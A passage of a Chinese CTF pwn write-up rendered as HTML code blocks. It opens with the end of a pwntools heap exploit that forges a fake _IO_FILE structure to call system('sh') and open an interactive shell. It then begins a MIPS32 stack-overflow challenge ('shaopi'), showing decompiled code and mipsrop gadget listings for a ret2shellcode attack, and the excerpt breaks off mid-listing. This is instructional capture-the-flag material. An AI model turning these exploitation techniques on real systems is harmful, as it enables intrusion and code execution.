number">0x420</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x418</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x531</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x21a110</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0xfe0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404040</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x600</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>fake_io_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x1a20</span>fake_IO_struct <span class="token operator">=</span> <span class="token string">b'  sh;\x00\x00\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span>              <span class="token comment">#rdi</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                             <span class="token comment">#_flag2</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">)</span>             <span class="token comment">#_lock = a writable address</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_io_addr <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">)</span>          <span class="token comment">#fake_wide_data</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_wfile_jumps'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span>        <span class="token comment">#fake_vatable</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0xe0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_io_addr <span class="token operator">+</span> <span class="token number">0x2e0</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x500</span> <span class="token operator">+</span> fake_IO_structedit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x608</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'9'</span><span class="token punctuation">)</span>leak<span class="token punctuation">(</span><span class="token string">"libc.address"</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>leak<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1800'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="shaopi"><a href="#shaopi" class="headerlink" title="shaopi"></a>shaopi</h2><p>MIPS32，静态链接<br><img src="/EXP_FILE/ee46d45cf538036ef86cdd08676b3dca_MD5.jpeg"></p><p>保护一看，多半是shellcode<br><img src="/EXP_FILE/31f02354431998877e3bc1b3f531fbc7_MD5.jpeg"></p><h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><p>找到start函数，确定程序main函数位置<br><img src="/EXP_FILE/572b1375526780c2df45c0b58b78f507_MD5.jpeg"></p><ul><li>main<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_400B38</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [sp+18h] [+18h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [sp+1Ch] [+1Ch]</span>  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [sp+20h] [+20h] BYREF</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [sp+50h] [+50h] BYREF</span>  <span class="token function">sub_400A94</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_414CA0</span><span class="token punctuation">(</span><span class="token string">"你喜欢吃苕皮🐎"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_414CA0</span><span class="token punctuation">(</span><span class="token string">"welcome to korey's 苕皮摊"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_414CA0</span><span class="token punctuation">(</span><span class="token string">"You can keep eating endlessly by entering a passphrase."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4083B0</span><span class="token punctuation">(</span><span class="token string">"your passphrase: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4084C0</span><span class="token punctuation">(</span><span class="token string">"%48s"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_427A60</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token function">sub_4007B0</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_4274A0</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token string">"5LiJ5YWD5LiA5Liy5Y2B5YWD5LiJ5Liy"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 比较</span>    <span class="token function">sub_407878</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">// exit</span>  <span class="token function">sub_414CA0</span><span class="token punctuation">(</span><span class="token string">"Congratulation!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sub_42BE60</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>运行看一下，可见是需要输入一串密码：<br><img src="/EXP_FILE/ce749c047765d24c1aa7dd87fa45028d_MD5.jpeg"><br>把5LiJ5YWD5LiA5Liy5Y2B5YWD5LiJ5Liy输进去，没有通过check</li></ul><p>看下字符串，感觉是base64加密<br><img src="/EXP_FILE/4bbd467901effe3b03445b37a4e11c59_MD5.jpeg"></p><p><img src="/EXP_FILE/dc6ebc3814649b8e5b658258efa8cfb1_MD5.jpeg"><br>解码<br><img src="/EXP_FILE/946541adf2a18c94bb7dfaf02042627e_MD5.jpeg"></p><p>接下来就是一个栈溢出了：<code>return (sub_42BE60)(0, v4, 0xF0);</code></p><p>由于mips的特殊性，NX保护不支持，于是ret2shellcode便成为了通用攻击手段</p><p>通过mipsrop插件找gadget：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Python<span class="token operator">></span>mipsrop<span class="token punctuation">.</span>tails<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">|</span>  Address     <span class="token operator">|</span>  Action                                              <span class="token operator">|</span>  Control Jump<span class="token operator">|</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">|</span>  <span class="token number">0x0042D418</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s1                                        <span class="token operator">|</span>  jr    $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042D42C</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s1                                        <span class="token operator">|</span>  jr    $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042D528</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s1                                        <span class="token operator">|</span>  jr    $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042D53C</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s1                                        <span class="token operator">|</span>  jr    $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00431084</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$a2                                        <span class="token operator">|</span>  jr    $a2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0045C914</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s3                                        <span class="token operator">|</span>  jr    $s3                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00469C30</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$v0                                        <span class="token operator">|</span>  jr    $v0                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00469C8C</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$v0                                        <span class="token operator">|</span>  jr    $v0                             <span class="token operator">|</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Found <span class="token number">8</span> matching gadgetsPython<span class="token operator">></span>mipsrop<span class="token punctuation">.</span>stackfinder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">|</span>  Address     <span class="token operator">|</span>  Action                                              <span class="token operator">|</span>  Control Jump<span class="token operator">|</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">|</span>  <span class="token number">0x00417170</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x44</span><span class="token operator">+</span>var_C                            <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x004172A0</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x44</span><span class="token operator">+</span>var_C                            <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00429A1C</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token operator">+</span>var_28                           <span class="token operator">|</span>  jalr  $s5                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00429C14</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x6C</span><span class="token operator">+</span>var_38                           <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00429CA8</span>  <span class="token operator">|</span>  addiu $v0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x6C</span><span class="token operator">+</span>var_40                           <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00429F00</span>  <span class="token operator">|</span>  addiu $v0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x170</span><span class="token operator">+</span>var_130                         <span class="token operator">|</span>  jalr  $s0                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042E68C</span>  <span class="token operator">|</span>  addiu $fp<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x438</span><span class="token operator">+</span>var_408                         <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042E840</span>  <span class="token operator">|</span>  addiu $s6<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x420</span><span class="token operator">+</span>var_408                         <span class="token operator">|</span>  jalr  $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042F140</span>  <span class="token operator">|</span>  addiu $s7<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x440</span><span class="token operator">+</span>var_404                         <span class="token operator">|</span>  jalr  $s5                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042F178</span>  <span class="token operator">|</span>  addiu $v1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x440</span><span class="token operator">+</span>var_428                         <span class="token operator">|</span>  jalr  $s6                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00431D44</span>  <span class="token operator">|</span>  addiu $s5<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token operator">+</span>var_28                           <span class="token operator">|</span>  jalr  $s4                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0043965C</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token operator">+</span>var_10                           <span class="token operator">|</span>  jalr  $fp                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0043D8F0</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x88</span><span class="token operator">+</span>var_C                            <span class="token operator">|</span>  jalr  $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00441C14</span>  <span class="token operator">|</span>  addiu $v1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x138</span><span class="token operator">+</span>var_104                         <span class="token operator">|</span>  jalr  $s0                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0044C9CC</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x458</span><span class="token operator">+</span>var_18                          <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0044CA0C</span>  <span class="token operator">|</span>  addiu $a0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x458</span><span class="token operator">+</span>var_2C                          <span class="token operator">|</span>  jalr  $fp                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0044CA44</span>  <span class="token operator">|</span>  addiu $a0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x458</span><span class="token operator">+</span>var_18                          <span class="token operator">|</span>  jalr  $fp                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0045C98C</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token operator">+</span>var_28                           <span class="token operator">|</span>  jalr  $s4                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0046C828</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0xC4</span><span class="token operator">+</span>var_98                           <span class="token operator">|</span>  jalr  $s6                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00422B18</span>  <span class="token operator">|</span>  addiu $a0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x40</span><span class="token operator">+</span>var_8                            <span class="token operator">|</span>  jalr  $v0                             <span class="token operator">|</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token 